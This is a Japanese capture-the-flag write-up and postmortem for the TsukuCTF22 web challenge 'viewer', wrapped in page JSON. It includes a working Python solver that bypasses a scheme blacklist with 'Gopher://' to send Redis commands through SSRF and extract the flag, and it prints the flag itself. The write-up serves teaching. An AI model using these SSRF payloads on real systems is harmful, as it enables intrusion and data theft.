{"pageProps":{"postData":{"id":"viewer","contentHtml":"# viewer\n\n## はじめに\n\n本問題で配布されたコードの一部に実装不備があり参加者体験を悪くしてしまったことを、CTF 終了後に幾つかのブログ記事やツイートから知りました。この件に関して、万全の問題提供ができなかったことをお詫び申し上げます。\n\n再発防止のために配布されるコードと本番環境のコードに差異を生まないようレビュー段階で注意する予定です。そして、参加者の皆様にとってより良い CTF にするためにも、不審な点などがあれば Discord の#ask-to-admin でご確認いただけると非常にありがたいです。よろしくお願いします。\n\nまた、これに伴い簡単なポストモーテムを行ったため Writeup 末尾に追記します。本件に興味がある方はご覧ください。\n\n## 問題文\n\nWriteups for TsukuCTF21 have been published.\nCheck them out if you'd like!\n\n## 難易度\n\nMedium\n\n## 解法\n\n配布されているソースコードを読むと、redis の中に FLAG が含まれていることが分かる。\\\ncurl で redis ということは別プロトコルを利用した SSRF が思い浮かぶ。\\\nFlag が存在している場所は`app.py` 上か redis 内部であるため、いずれかの情報を抜き取りたい。\\\n前者は `file://` scheme、後者は `gopher://` や`dict://` scheme を利用することになりそうだ。\n\nしかし、前者は以下の `response_sanitizer` によってサニタイズされるため、後者を利用することにする。\n\n```python\n# app.py\n# a response is also sanitized just in case because the flag is super sensitive information.\nblacklist_in_response = ['TsukuCTF22']\n\ndef response_sanitizer(body: str) -> str:\n    if any([scheme in body for scheme in blacklist_in_response]):\n        return \"SANITIZED: a sensitive data is included!\"\n    return body\n```\n\n`gopher://` 等は禁止されているように見えるが、case-insensitive なので大文字を含めることで回避できる。\n\nただし、gopher で対象の value を取るために、redis の key を知る必要がある。\\\nkey は redis の `keys *` で全列挙できるため、全ての key を列挙して response に flag が含まれるものを選択すれば良い。\n\nまた、`TsukuCTF22`という文字列を含む場合は sanitize されるが、`GETRANGE` で一部を抜き出すことで対処できる。\\\nしたがって、方針は以下の通りになる。\\\nまず、redis に含まれる key を全列挙し、次に GETRANGE で列挙したものの一部を読み取る。\n\nsolver は以下の通り。\n\n```python\nimport requests\nfrom urllib.parse import quote\nimport re\nimport sys\n\n# CHANGE HERE with an appropriate url\nTARGET_URL = \"http://127.0.0.1:31555\"\n\n# enumerate redis keys\nform = {\n    \"url\": \"Gopher://redis:6379/+\" + quote(\"keys *\\r\\nQUIT\\r\\n\")\n}\ncookies = {\n    \"__SESSION_ID\": \"d8c7d141-b8da-416b-a220-d8d7218c8bbc\", # dummy session id\n}\nres = requests.post(TARGET_URL, data=form, cookies=cookies)\n\nsession_id_list = re.findall(\"(.+-.+-.+-.+-.+)\\r\", res.text)\n# print(session_id_list)\n\n# check redis value\nfor session_id in session_id_list:\n    form[\"url\"] = \"Gopher://redis:6379/+\" + quote(f\"GETRANGE {session_id} 60 -1\\r\\nQUIT\\r\\n\")\n    cookies[\"__SESSION_ID\"] = session_id\n    res = requests.post(TARGET_URL, data=form, cookies=cookies)\n    if \"CTF22{\" in res.text:\n        print(\"TsukuCTF22{\" + res.text[res.text.find(\"CTF22{\") + len(\"CTF22{\"):res.text.find(\"}&#34;\")] + \"}\")\n        sys.exit(0)\n\n```\n\n上記のソルバを実行すると、以下の Flag が得られる。\n\n```\nTsukuCTF22{ur1_scheme_1s_u5efu1}\n```\n\n## ポストモーテム\n\n### 何が起こったか\n\n前提として、実装コードに不備があったために、問題にアクセスする時に Cookie に格納される `__SESSION_ID` が共有されているという問題がありました。\n\n本来であればこの問題により Flag が取得できないはずです。しかし、配布されたコードと本番環境のコードの Flag を Redis に追加する部分に差異があったために、配布されたコードで構築できる環境によっては Flag が取得できないにも拘らず、本番環境では Flag が取得できるという現象が起きました。\n\n実際に本番中はソルバによって Flag が取得できることのみを確認していたため、この問題に気づけませんでした。\n\n### 技術的詳細\n\nコードを用いて具体的に説明します。\n\nまず、以下が配布されたコードで Flag を Redis に追加する部分のコードです。\n\n```python\n# initialization\nredis = redis.Redis(host='redis', port=6379, db=0)\nflag = \"TsukuCTF22{dummy flag}\" # the flag is replaced a real flag in a production environment.\nid = str(uuid.uuid4())\nredis.set(id, json.dumps({\"id\": id, \"name\": flag}))\n```\n\nこれにより、UUIDv4 を ID とした Flag を含むデータが Redis に登録されます。\n\nしかし、アカウント登録の部分にて以下の通りその ID に対して上書きが行われます。\n\n```python\n    redis.set(id, json.dumps({\"id\": str(uuid.uuid4()), \"name\": name}))\n    redis.expire(id, 100)\n```\n\nその結果、Redis に登録された Flag が名前で上書きされてしまいます。\n\n詳しくは[mopi さんのブログ](https://mopisec.hatenablog.com/entry/2022/10/24/180123#viewer-8-solves-not-solved)にて検証されているためご覧ください。検証までブログに掲載してくださった mopi さん、ありがとうございました :pray:\n\n***\n\n一方、以下が本番環境のコードで Flag を Redis に追加する部分のコードです。\n\n```python\n# user session information\nredis = redis.Redis(host='redis', port=6379, db=0)\nusers = ['frt', 'ny_a', 'satoki', 'shio', 'taisyo', 'task', \"TsukuCTF22{ur1_scheme_1s_u5efu1}\", 'toto', 'xryuseix', 'y-chan', 'yu1k', 'yoshimi', 'ling', 'momoka', 'taru', 'imino']\nfor user in users:\n    id = str(uuid.uuid4())\n    redis.set(id, json.dumps({\"id\": id, \"name\": user}))\n```\n\n`id` はループでイテレートされているため、`id`が変更されるのは最後のユーザのみになります。そのため、本番環境では Flag の上書きが発生しませんでした。\n\n### 根本原因\n\n**根本原因はユーザ登録を行う id 用の UUIDv4 を再生成していなかったこと** にあります。その影響で、配布されたコードで構築される環境では、Redis に追加された Flag が上書きされてしまい取得することが不可能になります。\n\nしかし、上記の通り、**本番環境では Redis にダミーデータを含めて Flag を挿入していたために、Flag が上書きされずに取得できていました**。この差異は作問時から含まれていましたが、作問時には作問方針と解法の流れのみがレビューされていたために、この問題に気づけませんでした。\n\nまた、本番中は約 1 時間ごとに 1 回ソルバを回して Flag が得られることのみを確認していたために、配布ファイルには気を配れていませんでした。\n\n### 解決\n\n以下の通り `id` を生成してから登録することで、正しい実装になります。\n\n```python\n    id = uuid.uuid4()\n    redis.set(id, json.dumps({\"id\": str(id), \"name\": name}))\n    redis.expire(id, 100)\n```\n\n### 影響\n\n影響を受けたユーザは全ユーザです。一応、本件に関して言及してくださったブログやツイートを載せておきます。\n\n* [TsukuCTF 2022 Writeup](https://mopisec.hatenablog.com/entry/2022/10/24/180123#viewer-8-solves-not-solved)\n* [ツイート 1](https://twitter.com/zeosutt/status/1584214650853683200)\n* [ツイート 2](https://twitter.com/shinobe179/status/1584574685718585344)\n\n### 対応者\n\n問題が発覚したのは CTF 終了後だったため、本番中の対応者はいません。\n\n### 追記\n\n実装に関して、他にも修正すべき点がいくつかあったので以下に記載しておきます。\n\n**Exception が起きた時に PycURL のコネクションが close されない**\n\n配布ファイルは以下のようになっており、PycURL で `c.perform()` 実行時に Exception が発生した場合は `c.close()` が呼ばれません。\n\n```python\n        buf = BytesIO()\n        try:\n            c = pycurl.Curl()\n            c.setopt(c.URL, url)\n            c.setopt(c.WRITEDATA, buf)\n            c.perform()\n            c.close()\n\n            body = buf.getvalue().decode('utf-8')\n        except Exception as e:\n            traceback.print_exc()\n            abort(\"error occurs\")\n```\n\nしたがって、以下の通り `finally` 句を利用するべきです。\n\n```python\n        buf = BytesIO()\n        c = None\n        try:\n            c = pycurl.Curl()\n            c.setopt(c.URL, url)\n            c.setopt(c.WRITEDATA, buf)\n            c.perform()\n\n            body = buf.getvalue().decode('utf-8')\n        except Exception as e:\n            traceback.print_exc()\n            abort(\"error occurs\")\n        finally:\n            c.close()\n```\n\n**PycURL のタイムアウトが設けられていない**\n\nPycURL はデフォルトで 300\\[s]のコネクションタイムアウトを持っていますが、今回のアプリケーションの要件には長すぎです。今回の問題では得られた Redis の key に対して全探索を行う必要があり、コネクションが集中することは容易に想定できるため、タイムアウトは 10\\[s]くらいに設定しておいても良かったのではないかと思いました。\n\n### おわりに\n\nこの度は、作問者の実装不備によって、参加者体験を悪くしてしまったことを深くお詫び申し上げます。\n今後はレビュー時に解法の方針やフラグチェック用のソルバだけでなく、配布ファイルにも気を配ってレビューする予定です。\n\nまた、他の参加者も含めたより良い CTF 体験のために、Discord での#ask-to-admin にてお問い合わせいただくなどのご協力をお願いいたします。\n\n## 参考資料\n\n* [ポストモーテムテンプレート - PagerDuty](https://ueokande.github.io/incident-response-docs-ja/after/post_mortem_template/)\n","title":"viewer","description":"Writeups for TsukuCTF21 have been published. Check them out if you'd like!","author":"task4233","genre":"Web","solver":8,"point":500}},"__N_SSG":true}